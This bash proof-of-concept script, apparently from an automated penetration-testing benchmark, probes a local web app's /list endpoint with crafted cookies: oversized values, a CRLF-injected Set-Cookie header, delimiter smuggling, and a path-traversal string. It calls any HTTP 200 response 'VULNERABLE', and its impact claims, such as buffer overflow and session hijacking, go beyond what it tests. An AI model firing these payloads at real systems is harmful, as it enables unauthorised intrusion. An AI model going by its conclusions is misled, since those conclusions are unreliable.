#!/bin/bash
# POC: Demonstrates cookie validation bypass by accepting arbitrary cookie values, excessive lengths, CRLF injection, and special characters without validation
# Target: ./repo
# Created: 2025-12-02T16:23:10.964Z
# Session: benchmark-XBEN-075-24-miorxjbp

# Cookie Validation Bypass POC
# Tests: Long cookies, CRLF injection, special characters, duplicate cookies

TARGET="${1:-http://localhost:5000}"
echo "[*] Testing Cookie Validation Bypass on $TARGET"
echo ""

# Test 1: Extremely long cookie value (10,000+ characters)
echo "[TEST 1] Accepting extremely long cookie values (10,000+ chars)"
LONG_COOKIE=$(python3 -c "print('A' * 10000)")
RESPONSE=$(curl -s -w "\n%{http_code}" -b "user=$LONG_COOKIE" "$TARGET/list")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
echo "  Request: curl -b \"user=AAAA...AAAA (10000 chars)\" $TARGET/list"
echo "  Response HTTP Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "  [✓] VULNERABLE: Accepts 10,000+ character cookie values"
else
    echo "  [✗] Not vulnerable: Rejected long cookie (HTTP $HTTP_CODE)"
fi
echo ""

# Test 2: CRLF injection in cookie value
echo "[TEST 2] Testing CRLF injection in cookie value"
CRLF_COOKIE="test%0D%0ASet-Cookie:%20admin=true"
RESPONSE=$(curl -s -w "\n%{http_code}" -b "user=$CRLF_COOKIE" "$TARGET/list")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
echo "  Request: curl -b \"user=test%0D%0ASet-Cookie:%20admin=true\" $TARGET/list"
echo "  Response HTTP Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "  [✓] VULNERABLE: Accepts CRLF injection in cookie value"
else
    echo "  [✗] Not vulnerable: Rejected CRLF injection (HTTP $HTTP_CODE)"
fi
echo ""

# Test 3: Special characters and delimiters
echo "[TEST 3] Testing special characters and delimiters in cookies"
SPECIAL_CHARS="test;admin=true;path=/"
RESPONSE=$(curl -s -w "\n%{http_code}" -b "user=$SPECIAL_CHARS" "$TARGET/list")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
echo "  Request: curl -b \"user=test;admin=true;path=/\" $TARGET/list"
echo "  Response HTTP Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "  [✓] VULNERABLE: Accepts special characters and delimiters"
else
    echo "  [✗] Not vulnerable: Rejected special characters (HTTP $HTTP_CODE)"
fi
echo ""

# Test 4: Multiple cookie values (duplicate cookies)
echo "[TEST 4] Testing multiple cookie values (duplicate cookies)"
RESPONSE=$(curl -s -w "\n%{http_code}" -b "user=user1" -b "user=user2" "$TARGET/list")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
echo "  Request: curl -b \"user=user1\" -b \"user=user2\" $TARGET/list"
echo "  Response HTTP Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "  [✓] VULNERABLE: Accepts multiple duplicate cookie values"
else
    echo "  [✗] Not vulnerable: Rejected duplicate cookies (HTTP $HTTP_CODE)"
fi
echo ""

# Test 5: Arbitrary cookie format validation
echo "[TEST 5] Testing arbitrary cookie values without format validation"
ARBITRARY_VALUES=("notavalidformat" "0" "admin" "0123456789abcdef0123456789abcdef" "../../etc/passwd" "test@test" "test\"quoted\"")
VULNCOUNT=0
for VALUE in "${ARBITRARY_VALUES[@]}"; do
    RESPONSE=$(curl -s -w "\n%{http_code}" -b "user=$VALUE" "$TARGET/list")
    HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
    if [ "$HTTP_CODE" = "200" ]; then
        echo "  [✓] Accepted arbitrary cookie: user=$VALUE (HTTP $HTTP_CODE)"
        ((VULNCOUNT++))
    fi
done
echo "  [+] Application accepted $VULNCOUNT/7 arbitrary cookie formats without validation"
echo ""

# Summary
echo "[SUMMARY]"
echo "The application lacks proper cookie validation and accepts:"
echo "  - Extremely long cookie values (10,000+ characters)"
echo "  - CRLF injection sequences in cookie values"
echo "  - Special characters and delimiters without filtering"
echo "  - Multiple duplicate cookie values"
echo "  - Arbitrary cookie formats without format/length validation"
echo ""
echo "[IMPACT]"
echo "  - Buffer overflow risk from unvalidated cookie lengths"
echo "  - Header injection attacks (CRLF injection)"
echo "  - Session hijacking and fixation attacks"
echo "  - No server-side session validation"